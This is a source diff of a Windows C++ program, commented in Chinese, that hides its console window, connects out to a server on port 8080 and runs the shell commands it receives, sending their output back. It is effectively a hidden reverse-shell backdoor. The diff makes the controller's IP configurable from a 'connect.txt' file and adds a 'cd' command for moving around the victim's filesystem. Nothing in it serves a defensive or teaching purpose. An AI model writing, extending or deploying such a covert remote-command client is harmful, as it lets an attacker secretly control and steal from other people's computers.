@@ -4,12 +4,17 @@
 #include<windows.h>
 #include<unistd.h>
 #define PORT 8080
-#define SERVER_IP "127.0.0.1"
 //#error 请设定服务器IP再编译
 #define  BUFFER_SIZE 4196
 using namespace std;
 const char* kExitFlag = "exit";
 /// 执行cmd指令并返回结果
+char SERVER_IP[256];
+void get_ip(){
+	ifstream fin ("connect.txt");
+	fin>>SERVER_IP;
+	fin.close();
+}
 string getCmdResult(const char* strCmd)  
 {
 	char buf[10240] = {0};
@@ -31,6 +36,7 @@ string getCmdResult(const char* strCmd)
 }
 int main() {
 	ShowWindow(GetConsoleWindow(),SW_HIDE);
+	get_ip();
 	// 初始化socket dll。
 	WORD winsock_version = MAKEWORD(2,2);
 	WSADATA wsa_data;
@@ -74,6 +80,17 @@ int main() {
 			for(int i=0;i<strlen(recv_data)-4;i++){
 				ch[i]='\0';
 			}
+		}else if(recv_data[0]=='c'&&recv_data[1]=='d'){
+			for(int i=3;i<strlen(recv_data);i++){
+				ch[i-3]=recv_data[i];
+			}
+			chdir(ch);
+			char* ch1;
+			ch1=getcwd(NULL,0);
+			send(client_socket, ch1, strlen(ch1), 0);
+			for(int i=0;i<strlen(recv_data)-3;i++){
+				ch[i]='\0';
+			}
 		}else if(recv_data[0]=='e'&&recv_data[1]=='x'&&recv_data[2]=='i'&&recv_data[3]=='t'){
 			return 0;
 		}else{
@@ -82,7 +99,7 @@ int main() {
 			if(s==""){
 				send_data="无返回内容";
 			}else{
-				for(int i=0;i<strlen(recv_data)+11;i++){
+				for(int i=0;i<strlen(recv_data)+20;i++){
 					ch[i]='\0';
 				}
 				for(int i=0;i<s.size();i++){
